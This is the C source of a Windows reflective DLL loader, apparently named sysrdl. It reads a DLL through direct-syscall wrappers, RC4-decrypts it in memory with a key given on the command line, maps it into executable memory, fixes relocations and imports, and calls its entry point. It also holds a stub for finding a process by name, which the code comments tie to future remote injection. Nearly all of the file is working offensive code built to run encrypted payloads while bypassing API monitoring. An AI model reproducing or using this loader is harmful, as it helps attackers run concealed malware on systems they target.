#include "prototype.h"
#include "crypto.h"
#include "MyGetProcAddress.h"


#define FileDirectoryInformation 1
#define FileFullDirectoryInformation 2
#define FileBasicInformation 4
#define FileStandardInformation 5 
#define FileNameInformation 9
#define MAXPATH 260
#define MAX_KEY_LEN 256

wchar_t DllPath[MAX_PATH]; // 
unsigned char key[MAX_KEY_LEN];

// -----------------------------------------------------------
// Helper Function To construct UNICODE_STRING from C-Style String & arguments parsing
// ------------------------------------------------------------
void BuildDllPath(const char* userPath) {
    char absPath[MAX_PATH] = { 0 };

    // Get full path (resolves relative paths like .\ or ..\)
    if (_fullpath(absPath, userPath, MAX_PATH) == NULL) {
        fprintf(stderr, "[-] Failed to get full path\n");
        exit(1);
    }

    char ntPath[MAX_PATH];
    snprintf(ntPath, MAX_PATH, "\\??\\%s", absPath);

    // Convert to wide string
    MultiByteToWideChar(CP_UTF8, 0, ntPath, -1, DllPath, MAX_PATH);
}

BOOL isKeyNotEmpty() {
    if (key[0] == '\0') {
		/*printf("[*] Empty decryption key\n");*/
        return TRUE;
    }
	return FALSE;
}

void help() {
    printf("Usage: sysrdl.exe <path_to_dll> [-k <decryption_key>]\n");
    printf("Example: sysrdl.exe C:\\path\\to\\your.dll -k mysecret\n");
    printf("If the DLL is not encrypted, omit the -k argument.\n");
    exit(1);
}

void parse_args(int argc, char* argv[]) {
    if (argc < 2) {
        help();
    }

    const char* userDllPath = argv[1];

    // Build normalized NT-style path into global DllPath
    BuildDllPath(userDllPath);
    /*wprintf(L"[*] DLL Path: %ls\n", DllPath);*/

    // Default: empty key
    key[0] = '\0';

    // Look for -k (or --key) optionally
    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-k") == 0 || strcmp(argv[i], "--key") == 0) {
            if (i + 1 < argc) {

                strncpy_s((char*)key, MAX_KEY_LEN, argv[i + 1], _TRUNCATE);
                key[MAX_KEY_LEN - 1] = '\0';
                break;
            }
            else {
                // -k provided but no value
                fprintf(stderr, "[-] %s requires a value\n", argv[i]);
                help();
            }
        }
    }

}

// -----------------------------------------------------------
// RDL.asm Manual Declaration
// -----------------------------------------------------------
#ifdef __cplusplus
extern "C" {
#endif


	PVOID GetImageBaseAsm();
	// for process targeting
    typedef struct _SYSTEM_PROCESSES {
        ULONG NextEntryDelta;     
        ULONG ThreadCount;
        ULONG Reserved1[6];
        LARGE_INTEGER CreateTime;
        LARGE_INTEGER UserTime;
        LARGE_INTEGER KernelTime;
        UNICODE_STRING ProcessName;
        KPRIORITY BasePriority;
        HANDLE ProcessId;
        HANDLE InheritedFromProcessId;
    } SYSTEM_PROCESSES, * PSYSTEM_PROCESSES;

    typedef struct _TARGET_INFO {
        HANDLE hPID;
        UNICODE_STRING ProcName;
    } TARGET_INFO, * PTARGET_INFO;



#ifdef __cplusplus
}
#endif


// -----------------------------
// Reflective DLL Load to Current Process
// -----------------------------

void RDL() {

	// For visibility :)
    printf("\n");

	// Get Image Base of current process
	PVOID imageBase = GetImageBaseAsm();
	printf("[+] Image Base: %p\n", imageBase);
	
	// Load the DLL from disk into memory
    OBJECT_ATTRIBUTES oa;
    HANDLE hFile = NULL;
    NTSTATUS status;
    UNICODE_STRING dllname;
    IO_STATUS_BLOCK osb;

    RtlInitUnicodeString(&dllname, DllPath );
    InitializeObjectAttributes(&oa, &dllname, OBJ_CASE_INSENSITIVE, NULL, NULL);
    ZeroMemory(&osb, sizeof(osb));

    status = SysNtCreateFile(
        &hFile,
        FILE_GENERIC_READ,
        &oa,
        &osb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (status != STATUS_SUCCESS) {
		printf("[!] SysNtCreateFile failed: 0x%X\n", status);
    }
    FILE_STANDARD_INFO fsi;
    status = SysNtQueryInformationFile(
        hFile,
        &osb,
        &fsi,
        sizeof(fsi),
        FileStandardInformation
	);
    if (status != STATUS_SUCCESS) {
        printf("[!] SysNtQueryInformationFile failed: 0x%X\n", status);
	}
    wprintf(L"[+] Loaded DLL = %wZ, Size = %lld bytes\n", &dllname, fsi.EndOfFile.QuadPart);

	// Allocate memory for the DLL
	SIZE_T dllSize = (SIZE_T)fsi.EndOfFile.QuadPart;
    PVOID dllBytes = NULL;      
    SIZE_T size = dllSize;        

    status = SysNtAllocateVirtualMemory(
		(HANDLE)-1,             
        &dllBytes,                  
        0,                         
        &size,                     
        MEM_COMMIT | MEM_RESERVE,   
        PAGE_READWRITE              
    );

    if (status != STATUS_SUCCESS) {
        printf("[!] SysNtAllocateVirtualMemory failed: 0x%X\n", status);
        dllBytes = NULL;
    }
    else {

        ZeroMemory(dllBytes, size);
		wprintf(L"[+] Allocated %llu bytes at %p for DLL\n", size, dllBytes);
    }

	// Read the DLL into memory
    SIZE_T bytesRead = 0;
    status = SysNtReadFile(
        hFile,           
        NULL,           
        NULL,            
        NULL,            
        &osb,            
        dllBytes,        
        dllSize,        
        NULL,            
        NULL             
    );

    if (status != STATUS_SUCCESS) {
        printf("[!] SysNtReadFile failed: 0x%X\n", status);
    }
    else {
        bytesRead = (SIZE_T)osb.Information;
        printf("[+] Read %llu bytes from DLL= %wZ\n", bytesRead,&dllname);
		
        if (!isKeyNotEmpty()) {
            // rc4 init
            unsigned char state[256];
            rc4_init(state, key, strlen((char*)key));
            // Decrypt the DLL in memory
            rc4_crypt(state, (unsigned char*)dllBytes, bytesRead);
            printf("[+] DLL decrypted in memory, Key=%s\n", key);
        } else {
			printf("[!] No decryption key provided, assuming DLL is not encrypted\n");
		}

    }

	// Parsing NT Headers
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)dllBytes;
	IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)dllBytes + dosHeader->e_lfanew);
    
	// Allocating memory for DLL IMAGE
	// First in The prefferred base
    
	LPVOID preferredBase = (LPVOID)(ntHeaders->OptionalHeader.ImageBase);
	LPVOID remoteImage = preferredBase;
    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    SIZE_T imageSizeAlloc = imageSize;
    status = SysNtAllocateVirtualMemory(
		(HANDLE)-1,                 
        &remoteImage,               
        0,                          
        &imageSizeAlloc,            
        MEM_COMMIT | MEM_RESERVE,  
        PAGE_EXECUTE_READWRITE      
    );
    if (status != STATUS_SUCCESS) {
        printf("[!] SysNtAllocateVirtualMemory (Image) failed: 0x%X\n", status);
        remoteImage = NULL;
		// If preferred base fails, allocate at arbitrary base :) Fallback
        remoteImage = NULL;
        imageSizeAlloc = imageSize;
        status = SysNtAllocateVirtualMemory(
            (HANDLE)-1,                 
            &remoteImage,              
            0,                          
            &imageSizeAlloc,          
            MEM_COMMIT | MEM_RESERVE,  
            PAGE_EXECUTE_READWRITE     
        );
        if (status != STATUS_SUCCESS) {
            printf("[!] SysNtAllocateVirtualMemory (Image - arbitrary) failed: 0x%X\n", status);
            remoteImage = NULL;
        }
        else {
            ZeroMemory(remoteImage, imageSizeAlloc);
            wprintf(L"[+] Allocated %llu bytes at %p for DLL Image (arbitrary base)\n", imageSizeAlloc, remoteImage);
		}
    }
    else {
        ZeroMemory(remoteImage, imageSizeAlloc);
        wprintf(L"[+] Allocated %llu bytes at %p for DLL Image (preferredBase)\n", imageSizeAlloc, remoteImage);
	}
    printf("\n");
	printf("[INFO] Start Copying %d sections To Remote Image Base: %p\n", ntHeaders->FileHeader.NumberOfSections, remoteImage);

	// Copy Headers ;
	memcpy(remoteImage, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders);

	// Copy Sections ;
	IMAGE_SECTION_HEADER* section = (IMAGE_SECTION_HEADER*)((BYTE*)ntHeaders + sizeof(IMAGE_NT_HEADERS));
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID dest = (LPVOID)((BYTE*)remoteImage + section[i].VirtualAddress);
        LPVOID src = (LPVOID)((BYTE*)dllBytes + section[i].PointerToRawData);
        SIZE_T secSize = section[i].SizeOfRawData;
        memcpy(dest, src, secSize);
        /*wprintf(L"[+] Copied Section %.*s to %p, Size: %08X\n", 8, section[i].Name, dest, secSize);*/
		printf("    Copied Section %.8s to %p, Size: %08X\n", section[i].Name, dest, secSize);
	}

	// Perform Base Relocations
    SIZE_T delta = (SIZE_T)remoteImage - ntHeaders->OptionalHeader.ImageBase;
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size > 0) {
            SIZE_T parsed = 0;
            IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)remoteImage + relocDir.VirtualAddress);
            while (parsed < relocDir.Size) {
                DWORD pageVA = reloc->VirtualAddress;
                DWORD blockSize = reloc->SizeOfBlock;
                DWORD entryCount = (blockSize - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* entries = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD i = 0; i < entryCount; i++) {
                    WORD entry = entries[i];
                    WORD type = entry >> 12;
                    WORD offset = entry & 0x0FFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        SIZE_T* patchAddr = (SIZE_T*)((BYTE*)remoteImage + pageVA + offset);
                        *patchAddr += delta;
                    }
                    else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD* patchAddr = (DWORD*)((BYTE*)remoteImage + pageVA + offset);
                        *patchAddr += (DWORD)delta;
                    }
                }
                parsed += blockSize;
                reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + blockSize);
            }
            printf("[+] Applied base relocations, delta: %p\n", (PVOID)delta);
        }
        else {
            printf("[!] No relocation info found!\n");
        }
    }
    else {
        printf("[INFO] Loaded at preferred base, no relocations needed\n");
		printf("\n");
	}

    // resolve import address table
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
    IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)remoteImage);
    LPCSTR libraryName = "";
    HMODULE library = NULL;

    while (importDescriptor->Name != NULL)
    {
        libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)remoteImage;
        library = LoadLibraryA(libraryName);

        if (library)
        {
            PIMAGE_THUNK_DATA thunk = NULL;
            thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)remoteImage + importDescriptor->FirstThunk);

            while (thunk->u1.AddressOfData != NULL)
            {
                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
                {
                    LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
                    thunk->u1.Function = (DWORD_PTR)MyGetProcAddress(library, functionOrdinal,MAX_FORWARDER_CHAIN);
                   
                    // check mismatch with GetProcaddress
                    /*FARPROC myAddr = MyGetProcAddress(library, functionOrdinal, MAX_FORWARDER_CHAIN);
                    FARPROC realAddr = GetProcAddress(library, functionOrdinal);*/

                    /*if (myAddr != realAddr) {
                        printf("[!] MISMATCH: %s - Mine: %p, Real: %p\n",
                            functionOrdinal, myAddr, realAddr);
                        
                    }
                    thunk->u1.Function = (DWORD_PTR)myAddr;*/

                    
                }
                else
                {
                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)remoteImage + thunk->u1.AddressOfData);
                    DWORD_PTR functionAddress = (DWORD_PTR)MyGetProcAddress(library, functionName->Name,MAX_FORWARDER_CHAIN);
                    thunk->u1.Function = functionAddress;
                   /* FARPROC myAddr = MyGetProcAddress(library, functionName->Name, MAX_FORWARDER_CHAIN);
                    FARPROC realAddr = GetProcAddress(library, functionName->Name);

                    if (myAddr != realAddr) {
                        printf("[!] MISMATCH: %s - Mine: %p, Real: %p\n",
                            functionName->Name, myAddr, realAddr);
                    }
                    thunk->u1.Function = (DWORD_PTR)myAddr;*/
                }
                ++thunk;
            }
        }

        importDescriptor++;
    }

	// Call DllMain
	typedef BOOL(WINAPI* DLLEntry)(HINSTANCE, DWORD, LPVOID);
    DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    (*DllEntry)((HINSTANCE)remoteImage, DLL_PROCESS_ATTACH, 0);

	// Clean up Handle and Memory
    SysNtClose(hFile);
    SIZE_T freeSize = 0;
    SysNtFreeVirtualMemory((HANDLE)-1, &dllBytes, &dllSize, MEM_RELEASE);
    SysNtFreeVirtualMemory((HANDLE)-1, &remoteImage, &imageSize, MEM_RELEASE);
   
}

// ------------------------------- NOT USED IN THIS BUILD ------------------------------------------------
// Get PID of target process by name For Remote Process Injection In the Future builds Not implemented yet
// --------------------------------------------------------------------------------------------------------
BOOL GetPIDDebug(PTARGET_INFO pTargetInfo) {
    pTargetInfo->hPID = NULL;
    printf("[*] Querying SystemProcessInformation to find process: %ws\n", pTargetInfo->ProcName.Buffer);

    ULONG len = 0;
    NTSTATUS status = SysZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &len);

    if (status != 0xC0000004) {
        printf("[-] ZwQuerySystemInformation failed to get length: 0x%X\n", status);
        return FALSE;
    }

    PVOID buffer = malloc(len);
    if (!buffer) {
        printf("[-] Memory allocation failed\n");
        return FALSE;
    }

    ZeroMemory(buffer, len);

    status = SysZwQuerySystemInformation(SystemProcessInformation, buffer, len, &len);
    if (status != 0) {
        printf("[-] ZwQuerySystemInformation failed: 0x%X\n", status);
        free(buffer);
        return FALSE;
    }

    PSYSTEM_PROCESSES pCurrent = (PSYSTEM_PROCESSES)buffer;
    while (pCurrent) {

        // Compare process name
        if (pCurrent->ProcessName.Buffer &&
            _wcsicmp(pCurrent->ProcessName.Buffer, pTargetInfo->ProcName.Buffer) == 0) {
            pTargetInfo->hPID = pCurrent->ProcessId;
            printf("[+] Found target process PID: %u\n", (ULONG)(ULONG_PTR)pCurrent->ProcessId);
            break;
        }

        if (pCurrent->NextEntryDelta == 0)
            break;

        pCurrent = (PSYSTEM_PROCESSES)((PUCHAR)pCurrent + pCurrent->NextEntryDelta);
    }

    SIZE_T regionSize = len;
    status = SysNtFreeVirtualMemory((HANDLE) - 1, &buffer, &regionSize, MEM_RELEASE);
    if (status != STATUS_SUCCESS) {
        printf("[-] SysNtFreeVirtualMemory failed: 0x%X\n", status);
    }

    if (!pTargetInfo->hPID) {
        wprintf(L"[-] Process %ws not found.\n", pTargetInfo->ProcName.Buffer);
        return FALSE;
    }

    return TRUE;
}
